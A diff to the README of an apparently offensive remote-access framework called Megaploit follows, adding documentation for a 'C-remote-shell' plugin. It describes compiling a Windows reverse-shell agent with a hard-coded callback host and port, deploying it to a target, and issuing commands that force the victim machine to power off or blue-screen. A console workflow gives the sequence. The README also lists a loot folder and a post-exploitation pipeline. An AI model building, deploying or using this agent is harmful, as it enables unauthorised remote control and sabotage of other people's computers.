@@ -36,6 +36,7 @@
    - [Operations Commands](#operations-commands)
 10. [Toolbox](#toolbox)
 11. [Plugin System](#plugin-system)
+    - [C-remote-shell Plugin](#c-remote-shell-plugin)
 12. [Module System (full reference)](#module-system-full-reference)
 13. [AutoRunScript](#autorunscript)
 14. [Post-Exploitation Pipeline](#post-exploitation-pipeline)
@@ -204,6 +205,8 @@ Megaploit-main/
 ├── install.sh
 │
 ├── plugins/                     ← TOML plugin files
+│   ├── c_remote_shell.toml      ← C-remote-shell plugin descriptor
+│   └── c_remote_shell.py        ← C-remote-shell Python handlers
 ├── tools/                       ← Toolbox: git clones + tools.json
 ├── loot/                        ← All collected data + audit.log
 │
@@ -667,6 +670,36 @@ timeout = 120
 
 See [docs/C_PLUGIN_DEVELOPMENT.md](docs/C_PLUGIN_DEVELOPMENT.md) for the native C/C++ SDK.
 
+### C-remote-shell Plugin
+
+The [`C-remote-shell`](https://github.com/Levon-Volodin/C-remote-shell) submodule ships with a first-party plugin that integrates the Windows C agent directly into the operator console.
+
+**Plugin file:** [`plugins/c_remote_shell.toml`](plugins/c_remote_shell.toml) + [`plugins/c_remote_shell.py`](plugins/c_remote_shell.py)
+
+| Command | Description |
+|---|---|
+| `crs_build [lhost] [port]` | Compile the Windows C agent EXE (auto-detects MinGW / MSVC; bakes LHOST+PORT at compile time) |
+| `crs_probe` | Run the 46-signal C2 compliance report against the C-remote-shell source tree |
+| `crs_verbs` | List all wire verbs dispatched by the C agent; flags C-exclusive ones (`forceOff()`, `blueScreen()`) |
+| `crs_payload_info` | Print the exact MinGW build flags for the current LHOST/PORT |
+| `forceOff` | Send `forceOff()` to the active C session — force power-off via `NtSetSystemPowerState` ⚠ |
+| `blueScreen` | Send `blueScreen()` to the active C session — BSOD via `NtRaiseHardError` ⚠ |
+
+**Typical workflow:**
+
+```
+megaploit [0] » set lhost 10.0.0.1
+megaploit [0] » set port 4444
+megaploit [0] » crs_build              # compiles C-remote-shell/megaploit_c_agent.exe
+megaploit [0] » crs_probe              # verify all 4 security layers pass
+
+# Deploy the EXE + secret.key to the target, then:
+megaploit [1] » forceOff               # C-exclusive: force power off
+megaploit [1] » blueScreen             # C-exclusive: trigger BSOD
+```
+
+> **Requires:** `apt install mingw-w64` (Linux/macOS) or MSVC Developer Command Prompt (Windows).
+
 ---
 
 ## Module System (full reference)
@@ -927,7 +960,7 @@ See [`megaploit/core/protocol.py`](megaploit/core/protocol.py) for the full impl
 Megaploit-main/
 ├── server.py / agent.py / secret.key / requirements.txt / install.sh
 │
-├── C-remote-shell/              # Hardened Windows reverse shell (C)
+├── C-remote-shell/              # Hardened Windows reverse shell (C) — git submodule
 │
 ├── tests/                       # 507 tests — pytest
 │   ├── test_meterp.py           # NEW v4: 69 tests for meterp handlers + session
